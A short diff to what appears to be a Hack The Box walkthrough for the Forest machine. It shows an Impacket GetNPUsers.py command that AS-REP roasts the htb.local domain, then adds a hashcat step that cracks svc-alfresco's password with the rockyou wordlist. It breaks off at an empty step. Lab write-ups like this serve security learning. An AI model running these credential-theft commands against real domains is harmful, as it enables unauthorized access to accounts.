@@ -35,6 +35,10 @@
 
 `GetNPUsers.py -request -format hashcat -outputfile asreproastables.txt -dc-ip 10.129.95.210 'htb.local/'`
 
-<img width="716" height="135" alt="image" src="https://github.com/user-attachments/assets/9fd9a708-21f9-4930-9193-b8579aa8a195" />
+<img width="721" height="123" alt="image" src="https://github.com/user-attachments/assets/b7257a49-3010-43a5-b68a-c3dbad6b2352" />
 
+3. Crack hash using hashcat to get svc-alfresco's plaintext password
 
+`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`
+
+4. 
